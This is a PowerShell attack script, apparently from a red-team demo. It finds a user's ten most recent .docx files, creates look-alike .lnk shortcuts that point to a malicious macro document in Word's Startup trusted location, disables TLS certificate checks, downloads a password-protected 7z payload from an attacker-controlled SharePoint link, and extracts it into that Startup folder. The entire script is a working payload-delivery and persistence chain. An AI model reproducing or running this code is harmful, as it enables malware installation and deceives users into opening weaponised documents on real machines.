#Find Top 10 *.docx within User's directory (set to "TEST" directory for now)
$TopFiles = Get-ChildItem -Recurse C:\Users\$env:USERNAME\Documents\TEST -filter "*.docx" | sort LastWriteTime -Descending | select FullName | select -First 10

#Create arrays of existing files and future LNK's
$Files = $TopFiles.FullName
$LNK = $TopFiles.FullName -replace "docx","lnk"

#Create Shortcuts to malicious Totally-Legitimate-Document.docm within Word 2016's Trusted Location
foreach ($file in $LNK) 
	{
		$Shell = New-Object -ComObject ("WScript.Shell")
		$ShortCut = $Shell.CreateShortcut($file)
		$ShortCut.TargetPath=$env:USERPROFILE + "\AppData\Roaming\Microsoft\Word\Startup\Totally-Legitimate-Document.docm"
		$ShortCut.Save()
		sleep 1
	}
	
#Sharepoint URL - Substitute guestaccess.aspx with download.aspx
$LocalDir = Convert-Path .
$Path = $LocalDir + "\Latest-Forms.7z"
$ExtractPath = Join-Path -Path $env:USERPROFILE -ChildPath "\AppData\Roaming\Microsoft\Word\Startup\"
$Url = "https://eviler-my.sharepoint.com/personal/badguy_eviler_onmicrosoft_com/_layouts/15/download.aspx?docid=1432aadf08ea24739b1f6e036dfa554a7&authkey=ATdXKOSTNmKkZ6E4a2pJ3Us"
[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
$webClient = new-object System.Net.WebClient
$webClient.DownloadFile( $Url, $Path )
sleep 2

#Unzip and decrypt Payload - File: Latest-Forms.zip Password `BlackHat2017-Password12345`
#Alais
set-alias 7z "C:\Program Files\7-Zip\7z.exe"
7z e .\Latest-Forms.7z -pBlackHat2017-Password12345 -oC:\Users\$env:USERNAME\APPData\Roaming\Microsoft\Word\Startup\

#Delete Files

Exit
